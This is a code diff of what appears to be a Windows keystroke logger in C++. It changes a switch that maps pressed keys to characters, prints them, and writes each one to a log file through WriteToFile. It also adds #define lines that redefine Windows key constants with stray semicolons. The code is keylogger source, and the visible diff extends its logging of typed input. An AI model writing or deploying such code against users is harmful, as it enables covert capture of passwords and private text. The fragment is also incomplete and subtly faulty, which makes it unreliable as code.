@@ -1,9 +1,15 @@
 #include <iostream>
 #include <Windows.h>
 #include <fstream>
-#include <stdio.h>
 #include <string>
 #include <time.h>
+
+
+#define VK_MULTIPLY 0x6A;
+#define VK_SPACE 0x20;
+#define VK_ADD 0x6B;
+#define VK_F1 0x70;
+#define VK_TAB 0x09;
 
 
 void WriteToFile(LPCSTR text)
@@ -18,22 +24,28 @@ bool Key_is_Listed(WORD iKey)
 {
 	switch (iKey)
 	{
-	case VK_SPACE:
+	case 0x6A:
+		std::cout << "*";
+		WriteToFile("*");
+		break;
+
+
+	case 0x20:
 		std::cout << " ";
 		WriteToFile(" ");
 		break;
 
-	case VK_ADD:
+	case 0x6B:
 		std::cout << "+";
 		WriteToFile("+");
 		break;
 
-	case VK_F1:
+	case 0x70:
 		std::cout << " *F1* ";
 		WriteToFile(" *F1* ");
 		break;
 
-	case VK_TAB:
+	case 0x09:
 		std::cout << " *TAB* ";
 		WriteToFile(" *TAB* ");
 		break;
